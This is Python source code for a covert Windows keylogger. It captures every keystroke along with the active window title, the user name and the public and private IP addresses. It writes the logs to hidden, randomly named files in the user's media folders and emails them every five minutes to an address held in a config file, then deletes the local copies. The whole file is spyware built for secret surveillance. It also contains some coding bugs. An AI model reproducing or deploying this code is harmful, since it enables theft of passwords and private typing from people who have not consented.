from pynput.keyboard import Listener
import random
import win32gui
import os
import time
import requests
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config
import hidefile

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

msg = f"User: {user}\nPublic IP: {publicIP}\nPrivate IP: {privateIP}\nDate/Time: {datetime}"

loggedData = []
loggedData.append(msg)

oldApp = ''
deleteFile = []


def on_press(key):
    global oldApp
    newApp = win32gui.GetWindowText(win32gui.GetForegroundWindow())  # Finds out what app the user is in
    if newApp == 'Cortana':
        newApp = 'Windows Start Menu'  # If the user is in the start menu, it shows cortana, so to replace
    else:
        pass

    if newApp != oldApp and newApp != '':
        loggedData.append(f'[{datetime}] ~ {newApp}\n')
        oldApp = newApp
    else:
        pass

    key = str(key).strip('\'')

    loggedData.append(key)


def write_file(data):
    one = os.path.expanduser('~') + '/Documents/'
    two = os.path.expanduser('~') + '/Pictures/'
    three = os.path.expanduser('~') + '/Music/'
    four = os.path.expanduser('~') + '/Videos/'

    list = [one, two, three, four]

    filepath = random.choice(list)
    filename = str(data) + "I" + random.randint(1000000, 9999999) + ".txt"
    file = filepath + filename
    deleteFile.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(loggedData))

    hidefile.hide_file_windows(file)


def send_logs():
    count = 0

    fromaddr = config.fromaddr
    frompswd = config.pswd
    toaddr = fromaddr

    MIN = 5
    SECONDS = 60

    time.sleep(MIN * SECONDS)

    while True:
        if len(loggedData) > 1:
            try:
                write_file(count)

                subject = f'[{user}] ~ {count}'

                msg = MIMEMultipart()
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg['Subject'] = subject
                body = "Logged Data"
                msg.attach(MIMEText(body, 'plain'))

                attachment = open(deleteFile[0], 'rb')

                filename = deleteFile[0].split('/')[2]

                part = MIMEBase('application', 'octect-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition', 'attachment;filename=' + str(filename))
                msg.attach(part)

                text = msg.as_string()

                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login(fromaddr, frompswd)
                s.sendmail(fromaddr, toaddr, text)
                attachment.close()
                s.close()

                os.remove(deleteFile[0])
                del loggedData[0:]
                del deleteFile[0:]

                count += 1
                time.sleep(MIN * SECONDS)
            except:
                pass


if __name__ == '__main__':
    t1 = threading.Thread(target=send_logs())
    t1.start()

    with Listener(on_press=on_press) as listener:
        listener.join()
